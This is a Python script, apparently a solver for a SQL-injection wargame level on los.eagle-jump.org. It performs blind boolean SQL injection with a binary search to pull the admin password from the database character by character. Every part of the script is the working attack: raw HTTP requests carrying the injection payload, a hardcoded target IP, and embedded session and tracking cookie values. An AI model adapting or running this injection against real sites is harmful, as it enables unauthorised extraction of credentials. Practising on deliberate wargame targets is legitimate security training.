import socket

def dec2hex_str(num):
    hexstr = "abcdef"
    first = num % 16
    first_str = ''
    second = num // 16
    second_str = ''
    if first >= 10:
        first_str = hexstr[first - 10]

    else:
        first_str = str(first)

    if second >= 10:
        second_str = hexstr[second - 10]

    else:
        second_str = str(second)

    return second_str + first_str

def binsearch_low(x, y, low, high):
    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+ord(substr(substr(pw,+" + str(x + 1) + ",4),+" + str(y + 1) + ",+1))+>+" + str((low + high) // 2) + "%23 HTTP/1.1\r\n" + \
           "Host: los.eagle-jump.org\r\n" + \
           "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
           "\r\n"

    send.connect(("104.27.174.42", 80))
    send.send(data.encode())
    recv1 = send.recv(3000)
    send.close()

    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+ord(substr(substr(pw,+" + str(x + 1) + ",4),+" + str(y + 1) + ",+1))+<+" + str((low + high) // 2) + "%23 HTTP/1.1\r\n" + \
           "Host: los.eagle-jump.org\r\n" + \
           "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
           "\r\n"

    send.connect(("104.27.174.42", 80))
    send.send(data.encode())
    recv2 = send.recv(3000)
    send.close()
    
    if "Hello admin" in recv1.decode():
        result = binsearch_low(x, y, ((low + high) // 2) + 1, high)

    elif "Hello admin" in recv2.decode():
        result = binsearch_low(x, y, low, ((low + high) // 2) - 1)

    else:
        return (low + high) // 2

    return result

def binsearch():
    array = []
    for x in range(0, 10):
        for y in range(0, 4):
            result = binsearch_low(x, y, 0, 0xff)
            array += [result]
            print("x= " + str(x) + ", y= " + str(y) + ": " + str(array))

    return array

array = binsearch()
